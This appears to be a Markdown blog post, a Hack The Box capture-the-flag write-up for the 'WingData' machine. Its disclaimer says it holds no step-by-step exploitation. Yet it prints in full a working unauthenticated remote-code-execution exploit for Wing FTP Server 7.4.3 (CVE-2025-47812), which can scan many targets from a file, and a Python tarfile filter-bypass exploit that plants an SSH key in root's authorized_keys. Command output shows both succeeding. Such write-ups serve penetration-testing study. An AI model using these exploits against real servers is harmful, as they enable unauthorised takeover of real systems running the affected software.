@@ -1,0 +1,557 @@
+---
+title: WingData
+description: "This is a guide to CTF challenge WingData from HACK THE BOX."
+pubDate: "2026-02-18"
+heroImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d419202507a3bbf06e764c1c4a524f66.png?size=small&format=webp"
+author: "Koustubh Badshah"
+tags: ["WingData", "HackTheBox", "CTF", "HTB", "CVE-2025-47812"]
+---
+
+# WingData
+
+## ⚠️ Disclaimer
+
+<div style=" color: red;">
+The content published in this write-up is intended **strictly for educational and learning purposes**. 
+This post discusses concepts, methodologies, and high-level approaches related to **Hack The Box machine** and **does not include full solutions, flags, credentials, or step-by-step exploitation paths**.
+
+No sensitive information is disclosed that would compromise the integrity of active machines or violate Hack The Box’s rules. All analysis is based on publicly allowed practices and personal learning experiences.
+
+Readers are strongly encouraged to:
+- Follow **Hack The Box’s Code of Conduct**
+- Attempt the machines **independently**
+- Use this content only to **understand techniques**, not to shortcut challenges
+
+The author takes **no responsibility for misuse** of the information provided. Any testing or exploitation discussed should be performed **only in legal, authorized environments**.
+By engaging with this content, you agree to use it ethically and responsibly.
+
+</div>
+
+## Introduction
+
+This is a easy level HACK THE BOX, CTF challenge, it is a easy level linux machine.
+
+## Reconnaissance 
+
+As usual I started with a nmap scan of the targe machine
+
+```bash
+$ nmap -sCSV -O -A -p- -v -T4 <target-ip>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey:
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-title: Did not follow redirect to http://wingdata.htb/
+|_http-server-header: Apache/2.4.66 (Debian)
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (89%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0
+Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (90%), Linux 4.19 - 5.15 (90%), Linux 4.19 (89%), OpenWrt 21.02 (Linux 5.4) (89%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.286 days (since Wed Feb 18 05:31:08 2026)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+Adding the the domain to `/etc/hosts` by using `echo "<target-ip> wingdata.htb" | sudo tee -a /etc/hosts`.
+
+Now I started with exploring the web service running on port 80.
+
+I performed a directory enumeration on the web service using `gobuster`.
+
+```bash
+$ gobuster dir -w <path-to-wordlist> -u wingdata.htb
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://wingdata.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 317]
+/.htaccess            (Status: 403) [Size: 317]
+/.htpasswd            (Status: 403) [Size: 317]
+/assets               (Status: 301) [Size: 353] [--> http://wingdata.htb/assets/]
+/index.html           (Status: 200) [Size: 12492]
+/server-status        (Status: 403) [Size: 317]
+/vendor               (Status: 301) [Size: 353] [--> http://wingdata.htb/vendor/]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+```
+
+## Exploitation 
+
+Also during manual web enumeration I found a domain named `ftp.wingdata.htb` I added it to `/etc/hosts`.
+This link redirects to a Wing FTP login page. Whose verion is v7.4.3 finding about this version on web that it has a RCE vulnerability, [CVE-2025-47812](https://www.cve.org/CVERecord?id=CVE-2025-47812). I found a script on exploit-db.com that allows for this RCE.
+```python
+# Exploit Title: Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)
+# CVE: CVE-2025-47812
+# Date: 2025-06-30
+# Exploit Author: Sheikh Mohammad Hasan aka 4m3rr0r (https://github.com/4m3rr0r)
+# Vendor Homepage: https://www.wftpserver.com/
+# Version: Wing FTP Server <= 7.4.3
+# Tested on: Linux (Root Privileges), Windows (SYSTEM Privileges)
+
+# Description:
+# Wing FTP Server versions prior to 7.4.4 are vulnerable to an unauthenticated remote code execution (RCE)
+# flaw (CVE-2025-47812). This vulnerability arises from improper handling of NULL bytes in the 'username'
+# parameter during login, leading to Lua code injection into session files. These maliciously crafted
+# session files are subsequently executed when authenticated functionalities (e.g., /dir.html) are accessed,
+# resulting in arbitrary command execution on the server with elevated privileges (root on Linux, SYSTEM on Windows).
+# The exploit leverages a discrepancy between the string processing in c_CheckUser() (which truncates at NULL)
+# and the session creation logic (which uses the full unsanitized username).
+
+# Proof-of-Concept (Python):
+# The provided Python script automates the exploitation process.
+# It injects a NULL byte followed by Lua code into the username during a POST request to loginok.html.
+# Upon successful authentication (even anonymous), a UID cookie is returned.
+# A subsequent GET request to dir.html using this UID cookie triggers the execution of the injected Lua code,
+# leading to RCE.
+
+
+import requests
+import re
+import argparse
+
+# ANSI color codes
+RED = "\033[91m"
+GREEN = "\033[92m"
+RESET = "\033[0m"
+
+def print_green(text):
+    print(f"{GREEN}{text}{RESET}")
+
+def print_red(text):
+    print(f"{RED}{text}{RESET}")
+
+def run_exploit(target_url, command, username="anonymous", verbose=False):
+    login_url = f"{target_url}/loginok.html"
+
+    login_headers = {
+        "Host": target_url.split('//')[1].split('/')[0],
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": target_url,
+        "Connection": "keep-alive",
+        "Referer": f"{target_url}/login.html?lang=english",
+        "Cookie": "client_lang=english",
+        "Upgrade-Insecure-Requests": "1",
+        "Priority": "u=0, i"
+    }
+
+
+    from urllib.parse import quote
+    encoded_username = quote(username)
+
+    payload = (
+        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0dlocal+r+%3d+h%3aread(\"*a\")"
+        "%0dh%3aclose()%0dprint(r)%0d--&password="
+    )
+
+    if verbose:
+        print_green(f"[+] Sending POST request to {login_url} with command: '{command}' and username: '{username}'")
+
+    try:
+        login_response = requests.post(login_url, headers=login_headers, data=payload, timeout=10)
+        login_response.raise_for_status()
+    except requests.exceptions.RequestException as e:
+        print_red(f"[-] Error sending POST request to {login_url}: {e}")
+        return False
+
+    set_cookie = login_response.headers.get("Set-Cookie", "")
+    match = re.search(r'UID=([^;]+)', set_cookie)
+
+    if not match:
+        print_red("[-] UID not found in Set-Cookie. Exploit might have failed or response format changed.")
+        return False
+
+    uid = match.group(1)
+    if verbose:
+        print_green(f"[+] UID extracted: {uid}")
+
+    dir_url = f"{target_url}/dir.html"
+    dir_headers = {
+        "Host": login_headers["Host"],
+        "User-Agent": login_headers["User-Agent"],
+        "Accept": login_headers["Accept"],
+        "Accept-Language": login_headers["Accept-Language"],
+        "Accept-Encoding": login_headers["Accept-Encoding"],
+        "Connection": "keep-alive",
+        "Cookie": f"UID={uid}",
+        "Upgrade-Insecure-Requests": "1",
+        "Priority": "u=0, i"
+    }
+
+    if verbose:
+        print_green(f"[+] Sending GET request to {dir_url} with UID: {uid}")
+
+    try:
+        dir_response = requests.get(dir_url, headers=dir_headers, timeout=10)
+        dir_response.raise_for_status()
+    except requests.exceptions.RequestException as e:
+        print_red(f"[-] Error sending GET request to {dir_url}: {e}")
+        return False
+
+    body = dir_response.text
+    clean_output = re.split(r'<\?xml', body)[0].strip()
+
+    if verbose:
+        print_green("\n--- Command Output ---")
+        print(clean_output)
+        print_green("----------------------")
+    else:
+        if clean_output:
+            print_green(f"[+] {target_url} is vulnerable!")
+        else:
+            print_red(f"[-] {target_url} is NOT vulnerable.")
+
+    return bool(clean_output)
+
+def main():
+    parser = argparse.ArgumentParser(description="Exploit script for command injection via login.html.")
+    parser.add_argument("-u", "--url", type=str,
+                        help="Target URL (e.g., http://192.168.134.130). Required if -f not specified.")
+    parser.add_argument("-f", "--file", type=str,
+                        help="File containing list of target URLs (one per line).")
+    parser.add_argument("-c", "--command", type=str,
+                        help="Custom command to execute. Default: whoami. If specified, verbose output is enabled automatically.")
+    parser.add_argument("-v", "--verbose", action="store_true",
+                        help="Show full command output (verbose mode). Ignored if -c is used since verbose is auto-enabled.")
+    parser.add_argument("-o", "--output", type=str,
+                        help="File to save vulnerable URLs.")
+    parser.add_argument("-U", "--username", type=str, default="anonymous",
+                        help="Username to use in the exploit payload. Default: anonymous")
+
+    args = parser.parse_args()
+
+    if not args.url and not args.file:
+        parser.error("Either -u/--url or -f/--file must be specified.")
+
+    command_to_use = args.command if args.command else "whoami"
+    verbose_mode = True if args.command else args.verbose
+
+    vulnerable_sites = []
+
+    targets = []
+    if args.file:
+        try:
+            with open(args.file, 'r') as f:
+                targets = [line.strip() for line in f if line.strip()]
+        except Exception as e:
+            print_red(f"[-] Could not read target file '{args.file}': {e}")
+            return
+    else:
+        targets = [args.url]
+
+    for target in targets:
+        print(f"\n[*] Testing target: {target}")
+        is_vulnerable = run_exploit(target, command_to_use, username=args.username, verbose=verbose_mode)
+        if is_vulnerable:
+            vulnerable_sites.append(target)
+
+    if args.output and vulnerable_sites:
+        try:
+            with open(args.output, 'w') as out_file:
+                for site in vulnerable_sites:
+                    out_file.write(site + "\n")
+            print_green(f"\n[+] Vulnerable sites saved to: {args.output}")
+        except Exception as e:
+            print_red(f"[-] Could not write to output file '{args.output}': {e}")
+
+if __name__ == "__main__":
+    main()
+```
+
+Using this script
+```bash
+$ python3 exploit.py -u http://ftp.wingdata.htb -c 'whoami'
+wingftp
+$ python3 exploit.py -u http://ftp.wingdata.htb -c "find -name '*.xml'" -v
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'find -name '*.xml'' and username: 'anonymous'
+[+] UID extracted: a54bed361dec1247cd875edb7c020b72f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: a54bed361dec1247cd875edb7c020b72f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+./Data/_ADMINISTRATOR/admins.xml
+./Data/_ADMINISTRATOR/settings.xml
+./Data/1/users/maria.xml
+./Data/1/users/steve.xml
+./Data/1/users/wacky.xml
+./Data/1/users/anonymous.xml
+./Data/1/users/john.xml
+./Data/1/settings.xml
+./Data/1/portlistener.xml
+./Data/settings.xml
+./webadmin/crossdomain.xml
+./webclient/crossdomain.xml
+----------------------
+```
+I got the credentials for **wacky** as this was the only user present in `/home`, cracking the password with john I sucessfully logged into wacky and obtained the user flag.
+
+## Privilage Escalation
+
+I now went on further to obtain the root flag I tried to find what can I access as sudo and found.
+```bash
+wacky@wingdata:~$ sudo -l
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3
+        /opt/backup_clients/restore_backup_clients.py *
+```
+
+The file **restore_backup_client.py** 
+```python
+#!/usr/bin/env python3
+import tarfile
+import os
+import sys
+import re
+import argparse
+
+BACKUP_BASE_DIR = "/opt/backup_clients/backups"
+STAGING_BASE = "/opt/backup_clients/restored_backups"
+
+def validate_backup_name(filename):
+    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
+        return False
+    client_id = filename.split('_')[1].rstrip('.tar')
+    return client_id.isdigit() and client_id != "0"
+
+def validate_restore_tag(tag):
+    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Restore client configuration from a validated backup tarball.",
+        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
+    )
+    parser.add_argument(
+        "-b", "--backup",
+        required=True,
+        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
+             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
+    )
+    parser.add_argument(
+        "-r", "--restore-dir",
+        required=True,
+        help="Staging directory name for the restore operation. "
+             "Must follow the format: restore_<client_user> (e.g., restore_john). "
+             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
+    )
+
+    args = parser.parse_args()
+
+    if not validate_backup_name(args.backup):
+        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
+        sys.exit(1)
+
+    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
+    if not os.path.isfile(backup_path):
+        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
+        sys.exit(1)
+
+    if not args.restore_dir.startswith("restore_"):
+        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
+        sys.exit(1)
+
+    tag = args.restore_dir[8:]
+    if not tag:
+        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
+        sys.exit(1)
+
+    if not validate_restore_tag(tag):
+        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
+        sys.exit(1)
+
+    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
+    print(f"[+] Backup: {args.backup}")
+    print(f"[+] Staging directory: {staging_dir}")
+
+    os.makedirs(staging_dir, exist_ok=True)
+
+    try:
+        with tarfile.open(backup_path, "r") as tar:
+            tar.extractall(path=staging_dir, filter="data")
+        print(f"[+] Extraction completed in {staging_dir}")
+    except (tarfile.TarError, OSError, Exception) as e:
+        print(f"[!] Error during extraction: {e}", file=sys.stderr)
+        sys.exit(2)
+
+if __name__ == "__main__":
+    main()
+```
+And I found that script uses with tarfile.extractall(path=staging_dir,filter="data") which is vulnerable to [CVE-2025-4517](https://nvd.nist.gov/vuln/detail/CVE-2025-4517).
+I used the following script to exploit it.
+```python
+#!/usr/bin/env python3
+"""
+CVE-2025-4138 / CVE-2025-4517 — Python tarfile PATH_MAX Filter Bypass
+"""
+
+import tarfile
+import io
+import os
+import sys
+import argparse
+
+# Constantes para Linux
+DIR_COMP_LEN = 247
+CHAIN_STEPS = "abcdefghijklmnop"  # 16 niveles
+LONG_LINK_LEN = 254
+
+def build_exploit_tar(tar_path, target_file, payload, file_mode=0o644):
+    """
+    Construye archivo TAR malicioso para CVE-2025-4138
+    """
+    comp = "d" * DIR_COMP_LEN
+    inner_path = ""
+    
+    with tarfile.open(tar_path, "w") as tar:
+        # Stage 1: Cadena de symlinks
+        for step_char in CHAIN_STEPS:
+            # Directorio largo
+            d = tarfile.TarInfo(name=os.path.join(inner_path, comp))
+            d.type = tarfile.DIRTYPE
+            tar.addfile(d)
+            
+            # Symlink corto → directorio largo
+            s = tarfile.TarInfo(name=os.path.join(inner_path, step_char))
+            s.type = tarfile.SYMTYPE
+            s.linkname = comp
+            tar.addfile(s)
+            
+            inner_path = os.path.join(inner_path, comp)
+        
+        # Stage 2: Pivot symlink (excede PATH_MAX)
+        short_chain = "/".join(CHAIN_STEPS)
+        link_name = os.path.join(short_chain, "l" * LONG_LINK_LEN)
+        
+        pivot = tarfile.TarInfo(name=link_name)
+        pivot.type = tarfile.SYMTYPE
+        pivot.linkname = "../" * len(CHAIN_STEPS)
+        tar.addfile(pivot)
+        
+        # Stage 3: Escape symlink
+        target_dir = os.path.dirname(target_file)
+        target_basename = os.path.basename(target_file)
+        
+        depth = 8
+        escape_linkname = (
+            link_name + "/" + ("../" * depth) + target_dir.lstrip("/")
+        )
+        
+        esc = tarfile.TarInfo(name="escape")
+        esc.type = tarfile.SYMTYPE
+        esc.linkname = escape_linkname
+        tar.addfile(esc)
+        
+        # Stage 4: Write payload
+        payload_entry = tarfile.TarInfo(name=f"escape/{target_basename}")
+        payload_entry.type = tarfile.REGTYPE
+        payload_entry.size = len(payload)
+        payload_entry.mode = file_mode
+        payload_entry.uid = 0
+        payload_entry.gid = 0
+        tar.addfile(payload_entry, fileobj=io.BytesIO(payload))
+    
+    print(f"[+] Exploit tar: {tar_path}")
+    print(f"[+] Target: {target_file}")
+    print(f"[+] Payload size: {len(payload)} bytes")
+
+def main():
+    parser = argparse.ArgumentParser(description="CVE-2025-4138 Exploit")
+    parser.add_argument("--tar-out", "-o", required=True)
+    parser.add_argument("--preset", "-p", choices=["ssh-key"])
+    parser.add_argument("--payload", "-P", required=True)
+    args = parser.parse_args()
+    
+    if args.preset == "ssh-key":
+        target_file = "/root/.ssh/authorized_keys"
+        file_mode = 0o600
+        
+        # Leer SSH key
+        with open(os.path.expanduser(args.payload), "rb") as f:
+            payload = f.read()
+        if not payload.endswith(b"\n"):
+            payload += b"\n"
+    
+    build_exploit_tar(args.tar_out, target_file, payload, file_mode)
+
+if __name__ == "__main__":
+    main()
+```
+Executing it 
+```bash
+wacky@wingdata:~$ ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key -N ""
+Generating public/private ed25519 key pair.
+Created directory '/home/wacky/.ssh'.
+Your identification has been saved in /home/wacky/.ssh/wingdata_key
+Your public key has been saved in /home/wacky/.ssh/wingdata_key.pub
+The key fingerprint is:
+SHA256:c5SEElKiRtvGCTWgr9zSyV0QRqzk7dsl1y8BNi0o840 wacky@wingdata
+The keys randomart image is:
++--[ED25519 256]--+
+|  +oB=o. ..      |
+| o B.*o .. .     |
+|. * B. .. +      |
+| o + +.. * .     |
+|  . . +.S *      |
+|..+ o..E * o     |
+|.o = .o +   o    |
+|  .  . .   . .   |
+|            .    |
++----[SHA256]-----+
+
+wacky@wingdata:~$ python3 exploit.py \
+    --preset ssh-key \
+    --payload ~/.ssh/wingdata_key.pub \
+    --tar-out backup_888.tar
+[+] Exploit tar: backup_888.tar
+[+] Target: /root/.ssh/authorized_keys
+[+] Payload size: 96 bytes
+
+wacky@wingdata:~$ mv backup_888.tar /opt/backup_clients/backups/
+
+wacky@wingdata:~$ sudo /usr/local/bin/python3 \
+    /opt/backup_clients/restore_backup_clients.py \
+    -b backup_888.tar \
+    -r restore_win123
+[+] Backup: backup_888.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_win123
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_win123
+
+wacky@wingdata:~$ ssh -i ~/.ssh/wingdata_key root@127.0.0.1
+
+Last login: Wed Feb 18 04:27:18 2026 from 127.0.0.1
+root@wingdata:~# ls
+root.txt
+```
+And so I obtained the root flag.
